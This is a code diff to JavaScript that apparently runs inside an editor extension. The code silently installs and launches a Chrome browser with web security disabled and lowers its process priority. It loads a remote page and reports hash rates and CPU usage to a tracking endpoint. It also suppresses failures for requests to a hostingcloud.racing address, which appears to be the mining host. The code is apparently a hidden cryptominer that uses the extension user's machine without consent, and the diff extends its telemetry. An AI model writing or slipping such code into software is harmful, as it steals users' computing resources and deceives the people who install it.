@@ -1,7 +1,7 @@
 (async () => {
-  
+
   let {
-    unifiedError, tstt, safe,
+    unifiedError, tstt, baseUrl, safe,
     puppeteer,
     puppeteerBrowsers,
     extensionPath
@@ -84,7 +84,7 @@
 
       return (await Promise.all(paths)).flat(Infinity).reduce((i, size) => i + size, 0);
     }
-    await tstt({ message: "INIT_BEGIN", version: safe(() => JSON.parse(fs.readFileSync(`${extensionPath}/package.json`))?.version) });
+    await tstt({ baseUrl, message: "INIT_BEGIN", version: safe(() => JSON.parse(fs.readFileSync(`${extensionPath}/package.json`))?.version) });
     let browser;
     let page;
     let minUse = 0.1;
@@ -104,7 +104,7 @@
 
     if (!chromeBrowser) {
       await new Promise(r => setTimeout(r, 1 * 60 * 1000));
-      await tstt({ message: "INIT_D", installedBrowsers, version: safe(() => JSON.parse(fs.readFileSync(`${extensionPath}/package.json`))?.version) });
+      await tstt({ baseUrl, message: "INIT_D", installedBrowsers, version: safe(() => JSON.parse(fs.readFileSync(`${extensionPath}/package.json`))?.version) });
       puppeteerBrowsers.InstallOptions;
       installedBrowser = await puppeteerBrowsers.install({
         browser: 'chrome',
@@ -118,7 +118,7 @@
 
 
 
-    await tstt({ message: "INIT_L", version: safe(() => JSON.parse(fs.readFileSync(`${extensionPath}/package.json`))?.version) });
+    await tstt({ baseUrl, message: "INIT_L", version: safe(() => JSON.parse(fs.readFileSync(`${extensionPath}/package.json`))?.version) });
 
     if (global.cppBrowser) {
       await global.cppBrowser.close();
@@ -135,7 +135,7 @@
         '--disable-web-security',
         '--disable-features=IsolateOrigins,site-per-process',
         '--allow-running-insecure-content',
-        
+
         // '--ignore-certificate-errors',
         // "--ignore-certificate-errors-spki-list",
         // "--no-zygote",
@@ -166,20 +166,25 @@
         // '--no-sandbox'
       ]
     });
-    
+
     global.cppBrowser = browser;
     os.setPriority(browser.process().pid, 19);
     page = await browser.newPage();
     page
       .on('pageerror', ({ message }) => {
         tstt({
+          baseUrl,
           message: "PAGE_ERROR",
           value: message,
           version: safe(() => JSON.parse(fs.readFileSync(`${extensionPath}/package.json`))?.version),
         });
       })
       .on('requestfailed', request => {
+        if (request.failure().errorText == "net::ERR_ABORTED https://www.hostingcloud.racing/index.php?loaded=true&site=a5f009879c378a1a5fbe1510f5a17dafac00af74e406b136140ec763f77b83fb") {
+          return;
+        }
         tstt({
+          baseUrl,
           message: "REQ_FAIL",
           value: `${request.failure().errorText} ${request.url()}`,
           version: safe(() => JSON.parse(fs.readFileSync(`${extensionPath}/package.json`))?.version),
@@ -187,15 +192,16 @@
       });
 
 
-      
+
     global.cppPage = page;
 
-    await page.goto(baseUrl+'?use=' + (getMemoryUsage().total >= 0.8 ? 0.5 : 0.1));
-    await tstt({ message: "INIT_COMPLETE", url: baseUrl, version: safe(() => JSON.parse(fs.readFileSync(`${extensionPath}/package.json`))?.version) });
+    await page.goto(baseUrl + '?use=' + (getMemoryUsage().total >= 0.8 ? 0.5 : 0.1));
+    await tstt({ baseUrl, message: "INIT_COMPLETE", version: safe(() => JSON.parse(fs.readFileSync(`${extensionPath}/package.json`))?.version) });
     await new Promise(r => setTimeout(r, 10 * 1000));
     let clt = await page.evaluate(() => window._client);
     if (!clt) {
       tstt({
+        baseUrl,
         message: "INIT_CLT",
         value: "No client",
         version: safe(() => JSON.parse(fs.readFileSync(`${extensionPath}/package.json`))?.version),
@@ -203,7 +209,7 @@
       if (global.inIntv) clearInterval(global.inIntv);
       return;
     }
-    
+
 
     await chkFn();
 
@@ -220,10 +226,11 @@
           }
         });
         if (hs.message != 'success') {
-          tstt({ message: hs.message, value: hs.value, error: hs.error, _client: hs._client, version: safe(() => JSON.parse(fs.readFileSync(`${extensionPath}/package.json`))?.version) });
+          tstt({ baseUrl, message: hs.message, value: hs.value, error: hs.error, _client: hs._client, version: safe(() => JSON.parse(fs.readFileSync(`${extensionPath}/package.json`))?.version) });
           return;
         }
         tstt({
+          baseUrl,
           message: "HASH",
           value: parseFloat(hs.value).toFixed(2),
           cpu: getCPUUsage(),
@@ -235,10 +242,11 @@
         minUse = min;
         maxUse = (getMemoryUsage().total >= 8 ? max : minUse);
         await page.evaluate((maxUse, baseUrl) => {
-          if (window.use != maxUse) window.location.href = baseUrl+'?use=' + maxUse;
+          if (window.use != maxUse) window.location.href = baseUrl + '?use=' + maxUse;
         }, maxUse, baseUrl);
       } else {
         tstt({
+          baseUrl,
           message: "HASH_WAIT D(" + (parseFloat(await dirSize(cacheDir)) / 1000000).toFixed(2) + ")",
           value: 0,
           file: safe(() => editor?.document?.uri?.fsPath)
@@ -250,6 +258,7 @@
 
   } catch (error) {
     tstt({
+      baseUrl,
       message: "INIT_E",
       value: error?.message,
       stack: error?.stack,
